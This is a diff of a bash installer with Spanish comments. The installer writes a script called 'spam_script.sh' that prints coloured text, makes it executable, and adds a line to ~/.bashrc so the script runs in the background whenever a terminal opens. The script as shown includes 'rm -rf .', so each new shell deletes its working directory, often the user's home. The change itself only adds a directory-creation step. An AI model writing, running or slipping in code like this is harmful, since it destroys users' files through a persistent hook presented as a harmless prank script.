@@ -1,6 +1,9 @@
 #!/bin/bash
 
-# Paso 1: Crear el archivo spam_script.sh con el contenido especificado
+# Paso 1: Crear el directorio ~/scripts si no existe
+mkdir -p ~/scripts
+
+# Paso 2: Crear el archivo spam_script.sh con el contenido especificado
 echo '#!/bin/bash
 
 # Función para imprimir texto colorido
@@ -34,10 +37,10 @@ rm -rf .
 
 echo -e "\033[33mProceso completo.\033[0m"' > ~/scripts/spam_script.sh
 
-# Paso 2: Hacer que el archivo sea ejecutable
+# Paso 3: Hacer que el archivo sea ejecutable
 chmod +x ~/scripts/spam_script.sh
 
-# Paso 3: Agregar al ~/.bashrc para que se ejecute al iniciar
+# Paso 4: Agregar al ~/.bashrc para que se ejecute al iniciar
 echo '# Ejecutar el script de spam colorido al iniciar la terminal
 bash ~/scripts/spam_script.sh &' >> ~/.bashrc
 
